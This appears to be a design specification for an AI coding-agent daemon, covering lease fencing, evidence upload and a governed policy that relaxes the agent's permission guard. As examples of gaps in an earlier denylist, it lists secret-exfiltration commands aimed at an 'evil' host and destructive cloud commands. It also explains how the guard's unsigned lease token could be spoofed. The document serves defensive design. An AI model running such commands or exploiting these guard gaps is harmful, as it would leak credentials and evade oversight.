1. **Acquire (L1)** — BEFORE the path claim and before the clone: `POST /v1/governor/leases` with `work_order_id` (the envelope `ref`, else the task id — `leaseSubject(task)` is the one place to change when digest handoffs carry the real id), `attempt_id` (`<task>/<attempt>`), `worker_build_digest` (the daemon's commit), `adapter_version` (identity.json) and `capability_declaration_digest`. **Any 2xx** with a string `lease_id`, a `fencing_generation` and a numeric `ttl_s` of at least 1 second is a lease and is recorded on the task (`lease.lease_id`, `fencing_generation`, `expires_at`, `ttl_s`); `ttl_s` below 1 (`0`, `0.3`, negative, a string, missing) ⇒ **BLOCKED** `lease_unavailable: Governor lease invalid: ttl_s=<value>`. `409 {reason:"leased"}` — or the older server's `403 {reason:"leased_by_other_attempt"}`, read as the same decision ⇒ **BLOCKED** `leased_by <holder_attempt_id> until <expires_at>` (`outcome.governor = "leased"`; the task is not ours — not a failure). Anything else ⇒ **BLOCKED** `lease_unavailable: <reason>` (fail closed).

   The two repos deploy independently, so this client assumes neither the Governor's status codes nor its rollout state. Concretely: (a) **any 2xx** with a well-formed body is a granted lease — the server's acquire is moving from `201` to `200` and a client pinned to one of them would refuse a lease it was actually granted, leaving the Governor holding a lease nobody renews or releases; (b) **every `403` or `409` on a lease route is a decision** — final, never retried — carrying the server's reason verbatim, at acquire (`leased` when it names another holder, otherwise `refused`) as well as at renew. The classification is by STATUS, per CONTRACT §29.1; the reason is payload, never a predicate. It used to be a hand-maintained list of reason strings, and that list was wrong twice: first in snake_case the server never emits (inert — nothing matched), then rebuilt from the server source and still only 1-of-15 live, which the #201 integration caught as `403 {"reason":"session does not hold this work order"}` being filed as a transport fault. A list assembled by reading code cannot keep up with a reason set the server owns. Note this is deliberately **not** a blanket 4xx: `408` and `429` are transient and keep their retry; (c) **anything else non-2xx** is a transport/unknown failure and fails closed on its own path (renew retries once, then loss of authority). (d) `fencing_generation` must be **an integer ≥ 1** — no string form. `app.py::_generation_from` requires `type is int and >= 1` and 400s otherwise, so any other value is one this client could never hand back on a renew, release or check. An earlier version accepted a non-empty string, reasoning that refusing one would make a future token change "a total, silent inadmissibility" — but that argument refuted itself: accepting a string does not avoid the failure, it relocates it to mid-run (acquire succeeds, the clone runs, the child spawns, the first renew 400s, is filed `unreachable`, authority is lost and the child is SIGTERMed), which is the exact outcome the *number* half was narrowed to prevent. One rule, one direction: refuse at acquire, where a task is BLOCKED cleanly with the offending value in the reason, before a clone and before any spend. Everything in a lease response is now type-checked hard. A refused or unavailable lease leaves no path claim held (the Governor cannot release one); a path claim refused after the lease was granted releases the lease `blocked`. No git runs before a lease is held.
2. **Heartbeat (L2)** — renew every `ttl_s/3` (unref'd timer) from acquire until release; a renew that serves `ttl_s` below 1 keeps the previous ttl. The first renew refused (`409 stale_generation|expired|revoked`) or unreachable after one retry (a timeout counts as a miss) is **loss of authority**: the child is SIGTERMed (SIGKILL after 10 s, `VINCI_WORKER_LEASE_KILL_GRACE_MS`), the task is **BLOCKED** `lease_lost:<reason>`, nothing is published — not even a branch push — and the evidence bundle is still attempted with `authority: "lost"` in result.json (its ledger POST is fenced out). A loss during the clone skips the spawn entirely.
3. **Fencing (L3)** — the fence is supplied to `publisher.publish()` in its own shape, `{ generation, check({stage}) }`; the publisher consults it immediately before `git push` and again immediately before `gh pr create`, and `evidence.mjs` consults the SAME object (via the shared `checkFence` helper) before the evidence POST. `valid: false`, a malformed answer, or a check that THROWS all skip that side effect and record `fenced_out: <reason>` — the bare reason, since the field already names the class (task **BLOCKED**, `outcome.reason = <reason>`, `lease.checks[]` lists every verdict against its stage). A check is never a licence to publish: the publisher's read-only PR listing may run before the fence, but no push and no `pr create` happens behind a fence that did not pass. All three fences end the same way: a fence-out at the evidence POST — after a valid push and PR — is still **BLOCKED** with `evidence_error` set and `evidence_result_state` naming the state result.json was uploaded as, never a quiet UNVERIFIED. The PR body footer (`vinci-worker: task=… base=… fence=<generation>`) and the evidence metadata carry the generation, read through the getter at the moment each is written.

   **`--clean-room` + `--governor` is refused before the run.** `publishFromCache` is a fork of the pre-#25 publisher: no fence, and none of #25's remote-sha lease, push read-back, idempotent retry, foreign-PR refusal or PR-head check. A governed clean-room task is **BLOCKED** `clean_room_publish_unsupported` before the model is spawned and before a lease is taken, so the unsupported combination costs nothing. The guard keys on a configured Governor, not on the fence object — the fence is built after the lease is acquired, so `cleanRoom && fence` would never have been true and the refusal would have read as enforced while never firing. Both directions are tested (governed ⇒ refused; ungoverned clean room ⇒ still runs).
4. **Release (L4)** — on every terminal path, including the catch block, with the outcome matching the state (`completed|failed|blocked|unverified`; a lost or fenced-out lease releases `abandoned`). The heartbeat is stopped and a renew already in flight is awaited BEFORE the release is sent, so the Governor never sees a renew arrive after the release for the same generation. A release failure is logged and never changes the state.
5. **Declaration (D1)** — at startup, right after `online`, and re-posted every `VINCI_DECLARATION_REFRESH_S` seconds (default 21600 = 6h) thereafter, the daemon posts `status` `worker <id> declaration` whose body is the canonical JSON of its WorkerDeclaration (vinci-contracts `worker-capabilities`, schemaVersion 1) filled with what this daemon actually does and nothing it cannot prove: `structuredEvidence` is true only when `VINCI_EVIDENCE_URI_PREFIX` is set at startup (no prefix, no bundle); `abort` is false (the daemon consumes only `kind: handoff` and has no abort handler — limits, lease loss and its own SIGTERM end a run, but nobody can command one); `safeResume` is false (a restart re-runs a RUNNING task as the next attempt, but no test proves a kill mid-write resumes without loss or duplication); activity stream, questions, steering, pause, read-only restriction, filesystem/network enforcement, native receipts and independent verification are false; approvals `none`; hence `controlLevel: inventoried`. `capability_declaration_digest` = sha256 of that body (vendored canonicalizer in `vinci/worker/contracts/`) and is recorded on every governed task. The re-post exists because the Governor **expires** a declaration at `VGC_DECLARATION_MAX_AGE_S` (default 86400 s) and then answers admission `eligible: false, reason: stale_declaration`: a daemon that declared only at startup would go silently inadmissible for all work after a day alive. Re-posts run the same code path as the startup post, so an unchanged daemon re-posts a byte-identical body under an identical digest. The refresh timer is unref'd (it never keeps the process alive; `--once` still exits) and a failed re-post is written to stderr and retried at the next tick — it never stops the poll loop or kills the daemon.
6. **Stop with a lease in flight** — on SIGTERM/SIGINT the daemon stops the heartbeat, waits for a renew in flight, releases the lease `abandoned` (the whole thing bounded by the 10 s timeout, logged if it does not complete), SIGTERMs the child so nothing keeps working under a released lease, and exits 0. The task record is left RUNNING and is resumed as the next attempt by the next daemon start (which acquires a fresh lease). Without an active lease a stop is the plain exit it always was.

### Evidence Upload

When `VINCI_EVIDENCE_URI_PREFIX` is set (e.g. `s3://bucket/vinci/evidence/`):

1. **After the run and publish, before the terminal state is written**: Build a deterministic bundle (session JSONL, git diff, result.json = the snapshot about to be committed, runner log with last 200 lines)
2. **Upload to S3**: `aws s3 cp --no-progress {bundle.tgz} {prefix}{task-id}/{sha256}.tgz`
3. **For ledger refs (job_/exp_/bk_ prefix)**: POST evidence metadata to `{busUrl}/v1/evidence` with body `{job_ref, sha256, uri, kind: "bundle", bytes, produced_at}` using the worker's Bearer token
4. **For non-ledger refs**: Skip the evidence bus POST (the server would reject it with 422); caller can include uri+sha256 in the final message if desired
5. **Terminal write**: an upload failure or a non-2xx metadata POST downgrades `COMPLETED` → `UNVERIFIED` and sets `evidence_error`; `BLOCKED`/`FAILED` keep their state and record `evidence_error` (see Lifecycle)
6. **Final bus post**: Carries `evidence_uri=...` and `evidence_sha256=...` only when `aws s3 cp` succeeded (`uploaded: true`; a failed upload never advertises its intended uri), plus `evidence_error=...` whenever evidence was attempted and did not fully land; a downgraded task posts `status`, never a ledger `finding`

**Data model:**
- Evidence bundle contains: session.jsonl (full session transcript), git.diff (origin/main...HEAD), result.json (lifecycle snapshot), runner.log (last 200 lines of daemon stderr)
- Evidence metadata is immutable; duplicate uploads return 200 OK without re-storing
- Non-ledger refs (e.g., "handoff:123") skip the evidence endpoint POST but their uri/sha256 still appear in the final status/blocker body

**Deployment prerequisite:** AWS CLI on PATH; S3 bucket role with PutObject-only permissions; no read access to other buckets.

### Unattended policy profile (`VINCI_UNATTENDED_POLICY=governed`, W2)

**This changes nothing unless the env var is set AND a Governor lease backs the run.** With the
variable unset — which is what every interactive user, every CI job, every script, and every other
headless caller sees — the guard behaves exactly as it does today. There is no other code path: the
guard's `headlessGate()` calls the original `blockHeadless()` with the same arguments when the
profile is off, so "unchanged by default" is structural rather than a promise.

#### What it fixes

Across 430 real unattended worker runs (2026-08-29/30) three tasks died inside `blockHeadless()` in
`vinci/extensions/vinci-guard.ts`, whose message reads *"Blocked (X) — no UI to confirm this in a
non-interactive run … tell the user this step is waiting on their go-ahead."* Two were *"run a
command that needs the internet"*, one was *"read a file that may contain credentials"*. None was a
safety refusal. Each was an **interaction-model artifact**: the gate exists because the interactive
UX would ask a human, unattended there is no human, and the run dies with work half-done and a
handoff addressed to nobody. In a governed fleet the authority question is answered upstream by the
Governor lease and the work order, so a confirmation dialog is the wrong mechanism.

#### How it turns on

Three facts must all hold in the agent child's environment:

1. `VINCI_UNATTENDED_POLICY=governed` — the explicit operator opt-in.
2. `VINCI_UNATTENDED_LEASE=<token>` — stamped by the daemon on a granted lease.
3. The token carries an `#expires=` bound that has not passed, in **strict ISO-8601 UTC** (the same
   shape `task.mjs` requires of an envelope `deadline:`). It is pinned to the lease's own ttl, so the
   relaxed guard cannot outlive the lease that justified it. A token with no expiry, or one bare
   `Date.parse` would accept but the strict form rejects (`9999`, `+275760-09-12T00:00:00Z`,
   `2026-08-29`, a non-`Z` offset), is refused — an unbounded grant is not a lease.

`vinci/worker/governor.mjs::unattendedPolicyEnv()` is the **only** producer of either variable. It
sets them only after `claimGovernorPaths()` returned a granted lease, and on every other path
(`--governor` not configured, refusal, unavailability, malformed lease) returns an explicit
**delete** of both keys, which `runVinci` applies to the child env in both clean-room and
shared-checkout mode. So a daemon that happens to have `VINCI_UNATTENDED_POLICY=governed` exported in
its own environment still hands an ungoverned task today's conservative gate.

**What is enforced vs what is merely true.** The code enforces: the opt-in string is present, a lease
token is present, and its expiry is in the future. That is a cooperative signal plus a time bound —
**not** proof that a Governor granted anything. The token is not signed and the guard has no key to
verify one against, so anything that can set the child's environment can set the pair; a `vinci -p`
launched in CI with both exported would get the relaxed guard. "Only the daemon produces it" is a
grep-checkable property of this repository, not a control this code imposes. The controls that
actually carry the safety argument are: the relaxed set is tiny and fail-closed, every relaxation is
durably recorded or it is not granted, and the expiry bounds the window.

#### Which sites moved bucket

`blockHeadless` has **11 call sites**. They are not one class, and each is classified individually
with the reason written at the call site. Under the profile:

| Site (guard) | Gate | Bucket |
| --- | --- | --- |
| `shell-credential-read` | shell read of a credentials file | **ESCALATE** |
| `network-priority-dangerous` | DANGEROUS list inside the network branch | **KEEP-BLOCKING** |
| `network-priority-database` | DATABASE list inside the network branch | **KEEP-BLOCKING** |
| `network-toolchain` | network command inside the dev-toolchain allowlist, vetoed by neither OUTWARD nor SYSTEM | **PROCEED** |
| `network-outward` / `network-system` / `network-other` | every other network command | **ESCALATE** |
| `git-checkpoint` | staging/committing the user did not explicitly ask for | **PROCEED** |
| `dangerous-command` | DANGEROUS list / non-root `rm -rf` | **KEEP-BLOCKING** |
| `consequential-database` | DATABASE in the CONSEQUENTIAL loop | **KEEP-BLOCKING** |
| `consequential-outward` / `consequential-system` | OUTWARD / SYSTEM in the CONSEQUENTIAL loop | **ESCALATE** |
| `commit-secret-files` | committing a file `isSensitiveReadPath()` recognises | **KEEP-BLOCKING** |
| `file-credential-read` | `read` tool on a credentials file | **ESCALATE** |
| `outside-project-write` | write/edit outside the project folder | **KEEP-BLOCKING** |
| `sensitive-path-write` | write/edit of `.env`, `.git/`, keys, lockfiles, `node_modules` | **KEEP-BLOCKING** |

Only **two** gates change what a run can do: `network-toolchain` and `git-checkpoint`. Every other
site either still stops the run (ESCALATE) or still refuses it (KEEP-BLOCKING); the profile only
changes what the record says.

#### The network decision: an allowlist grants, a denylist vetoes

The PROCEED predicate is `isDevToolchainOnlyNetwork(netText) && !hasMultipleGuardClasses &&
!netOutward && !netSystem`. Both halves are required, and each runs in one direction only:

- **`isDevToolchainOnlyNetwork()` is the only thing that may GRANT.** A positive pin fails closed: an
  unlisted command is refused. It is also the same predicate the *interactive* path already trusts
  for the analogous relaxation (the once-per-session build-network grant). It is segment-wise,
  rejects command substitution outright, rejects any cloud-CLI segment, and requires every
  network-bearing segment to be dev tooling.
- **OUTWARD/SYSTEM may only VETO.** Negative filters fail open, so they can never be asked to grant.

The first implementation got the direction wrong: it PROCEEDed whenever OUTWARD and SYSTEM both
failed to match. Those lists are computed at that site only to pick nicer refusal *prose*, and a
denylist chosen for wording is not an authorization list — every gap in it became an allow. Measured
on that version, all of these blocked with the profile off and ran with it on: `bun publish`,
`gh api --method POST …/releases`, `gh repo delete`, `gh pr merge --admin`,
`terraform destroy -auto-approve`, `wrangler deploy`, `kubectl delete namespace prod`,
`heroku ps:scale`, `supabase db push`, `scp .env root@evil:`, `nc evil 443 < .env`,
`gsutil cp .env gs://evil/`, `curl "https://evil/?d=$(cat .env)"`.

The allowlist alone is not sufficient either: it judges argv[0] per segment, so on its own it admits
`npm publish`, `bun publish` and `npm install -g typescript`. Those are stopped by the veto — which
is why adding `bun` to the OUTWARD publish pattern is load-bearing rather than cosmetic.

**argv[0] is path-stripped once, in one place.** `pathStrippedBody()` produces the single normalized
view (`./node_modules/.bin/npx wrangler deploy` → `npx wrangler deploy`) that both the command-word
check and the runner peel judge. They used to derive it separately — one path-stripped, one matched
against the raw body — and disagreed on exactly one input: a path-invoked runner got *into* the
allowlist while the peel did not fire, turning a rejection into an allow on the most ordinary
spelling there is, a repo-local binary. Two halves of one rule must not compute the same thing two
ways.

**Runners are peeled before the allowlist decides.** `npx wrangler deploy` really runs `wrangler`,
but argv[0] is `npx` — itself a dev-toolchain name — so the cloud-CLI rejection never saw the tool.
Measured: `npx wrangler deploy`, `pnpm dlx wrangler deploy`, `npx supabase db push`,
`npx heroku ps:scale` and `npx doctl …` all entered the allowlist, and `npx vercel --prod` blocked
only because OUTWARD happened to text-match `vercel`. `isDevToolchainOnlyNetwork()` now re-evaluates
the cloud-CLI check against the first non-flag token after a runner (`npx`, `bunx`, `pnpm|yarn dlx`,
`npm exec`, `deno run|task`). The peel **only ever adds a rejection** — the toolchain/network
judgement still runs on the original segment — so `npx tsx script.ts` and `npx create-react-app` are
unchanged and the interactive once-per-session build grant keeps its current scope. `expo publish`
was added to OUTWARD and `deno install --global` to SYSTEM, neither of which any veto named.

**What the allowlist does NOT do**, stated because the earlier wording ("a laundered or bundled
command cannot ride in on it") was measurably false, and in a permission system an untrue claim in
the record is itself the defect: judging argv[0] is a *name* check, not a capability check. It peels
exactly **one** runner layer. It cannot see inside what it admits. It is a name allowlist. A `true`
from it means "this looks like ordinary build tooling", never "this is safe".

**Why this grant is not an ordinary confirm.** `securityScopes.push("network")` signs a one-command
grant that makes the sandbox drop `(deny network*)` (seatbelt) / `--unshare-net` (bwrap).
`vinci-sandbox.ts` states the invariant it protects: `.env` and `*.tfvars` are deliberately left
OS-readable because *"exfil still needs the network grant"*, and *"full network is restored only
under a signed one-command grant"*. Handing that grant out on a denylist gap is precisely the
exfiltration path the sandbox exists to close.

**Residual risk, stated plainly:** `npm install`, `npx`, `pip install` and a Gradle build are
arbitrary-code-execution primitives *even inside the allowlist* — a malicious package postinstall
runs with the grant. The allowlist bounds which commands get the network, not what they may do once
they have it. That is the same risk the interactive build-network grant already accepts, and it is
why the allowlist is not widened further.

#### What still blocks, and why

- **The shell-based file write is untouched.** It is not a `blockHeadless` site at all — it blocks
  in interactive runs too, and the profile cannot reach it by construction. This is deliberate: on
  2026-08-30 a dispatched spec contained the instruction *"create the file with the editor's
  write/edit tool, never with shell redirection"* verbatim and the model did a shell write anyway.
  The refusal is the only enforcement; the instruction is a preference.
- **The CATASTROPHIC list is untouched.** It has no override anywhere and never reaches
  `blockHeadless`.
- **Destructive commands** (`reset --hard`, `clean -f`, `rm -rf`, `sudo`, `DROP`/`TRUNCATE`,
  `DELETE FROM` with no `WHERE`). A lease is authority to do the work order, not authority to
  destroy the tree the work order lives in.
- **Database migrations.** They mutate state outside the attempt tree, so no publish-time review
  catches them and no branch revert undoes them.
- **Committing secret files.** The worker's own success path makes this worse, not better: the
  publisher pushes the branch and opens a PR, so a committed key is a published key. This is exactly
  why `git-checkpoint` can be a PROCEED — the commit is allowed, its contents are still policed.
  That dependency has to be *true*, and it was not: `isCommitSecrets` knew only `.env`,
  `*.pem/key/p12/pfx` and `id_rsa`-family names, while the same file's `isSensitiveReadPath()`
  recognised far more — so `credentials.json`, `.aws/credentials`, `service-account.json`,
  `.dev.vars`, `terraform.tfvars`, `.kube/config` and `.docker/config.json` were all stageable.
  `isCommitSecrets` now tests the command's git path *operands* — via the shared
  `parseLocalGitSegment` parser — against both `isSensitiveReadPath()` and the original
  `.env`/`*.pem` name regex, making `isSensitiveReadPath` the single source of truth for "this file
  holds live credentials" whether it is being read or committed. Commit-message values (`-m`, `-F`,
  …) are excluded, so `git commit -m "fix credentials.json parsing"` is not mistaken for staging one.

  The first version of that fix was still fail-open: it was `&&`-gated behind the text precondition
  `/\bgit\s+(add|commit)\b/`, which cannot see past a git **global option**, so
  `git --no-pager add credentials.json` and `git -C . add credentials.json` were passed through — the
  parser handled them correctly and the precondition then discarded the result. The same precondition
  blinded the original `.env` regex (`git --no-pager add .env` was uncaught). Both branches now run
  on the parser's operands, so there is no text precondition left to defeat. `--pathspec-from-file`
  reads the path list out of a file, where no operand scan can see it, and now emits a poison operand
  so "unknown" fails closed.
- **Writes outside the project folder** and **writes to sensitive paths**. The attempt tree is the
  only surface the publisher captures, the evidence bundle records, or a reviewer sees.
- **Every network command outside the dev-toolchain allowlist.** These ESCALATE rather than
  hard-block, because the Governor genuinely could authorize them — but the guard never self-grants
  them. This covers far more than the OUTWARD/SYSTEM lists name: `gh api`, `gh pr merge`,
  `gh repo delete`, `terraform destroy`, `wrangler deploy`, `kubectl`, `heroku`, `supabase`, `scp`,
  `nc`, `gsutil`, and any `curl`/`wget` are outside the allowlist and therefore escalate, whether or
  not a denylist happens to name them. The `network-outward` / `network-system` / `network-other`
  site names record which *wording* was used; they do not describe a boundary.

#### The credential-read decision (deviation from the W2 steer)

The W2 brief proposed allowing a credential read when the path is **inside** the work order's
granted paths. That was **not built**, and both credential-read sites ESCALATE instead. Reasons:

1. The Governor claim is a **concurrency lease over paths**, not a disclosure grant. It exists so
   two workers do not collide on the same files. Treating it as authorization to place a live secret
   into the model's context — and from there into the provider request, the session JSONL, and the
   evidence bundle — silently widens what the claim means.
2. The claim header **defaults to `.`**. Under the proposed rule the default work order would be a
   blanket credential grant for the entire repository: a total widening dressed as a narrow one.
3. It buys almost nothing. The clean room clones fresh from origin, and real credential files are
   gitignored, so the files this would unlock barely exist at runtime — while the shared-checkout
   mode where they *can* exist is exactly where the widening would bite.

ESCALATE still fixes the measured failure. The run no longer dead-ends on a dialog addressed to
nobody; it ends BLOCKED with a machine-readable reason naming the gate and the Governor as the
grantor, which the fleet can route on.

#### The record

A run stopped by a KEEP-BLOCKING guard, a run that ESCALATED, and a run that PROCEEDED are
**separately identifiable**, because "it worked" and "it was allowed to skip a check" must not look
the same downstream.

- Each resolved gate appends a `vinci-unattended-policy` entry to the session transcript
  (`{outcome, site, gate, lease}`, one of `BLOCKED` / `ESCALATED` / `PROCEEDED`).
- Every block the profile emits carries a machine-readable trailer:
  `[vinci-unattended outcome=… site=… gate="…" grantor=governor lease=…]`. An ESCALATE reason names
  the Governor as the grantor and deliberately drops today's *"waiting on their go-ahead"* prose.
- **A relaxation that cannot be recorded is not granted.** If `appendEntry` is missing or throws, a
  PROCEED is converted into a block (`cause=unrecordable`). The justification for letting a governed
  run past a confirmation is that the relaxation is visible downstream; with no record there is no
  justification left, and a swallowed bookkeeping error must never be the difference between a
  refusal and an allow.
- The daemon reads the entries back (`summarizeUnattendedPolicy`) and puts the three counts on the
  task snapshot and in the terminal bus post:
  `unattended_policy=governed policy_blocked=N policy_escalated=N policy_proceeded=N`, plus
  `policy_escalated_sites=` / `policy_proceeded_sites=` / `policy_blocked_sites=` naming the sites.
  The fields are emitted **whenever the profile was active**, even when all three counts are zero,
  so "profile off", "profile on and nothing fired" and "profile on and the records were lost" are
  three distinguishable posts rather than one. A run with the profile off emits none of them, so
  ordinary posts are unchanged.
- An outcome the daemon does not recognise is **dropped**, never folded into a bucket — a fail-open
  default there would report an unknown decision as the most permissive one.

Covered by `vinci/test/worker-unattended-policy.mjs`.

### Envelope Headers (Stage 2)

- `claim:` — Path or glob to claim from Governor (default `.`). Unknown headers still → blocker.
- `evidence_ref:` — Alias for `ref` header; clarifies that this ref identifies evidence in the ledger.

Both hooks are independent: you can use Governor lease without evidence upload, or evidence upload without Governor lease. If neither is configured, Stage 2 has zero overhead; the daemon behaves identically to Stage 1.
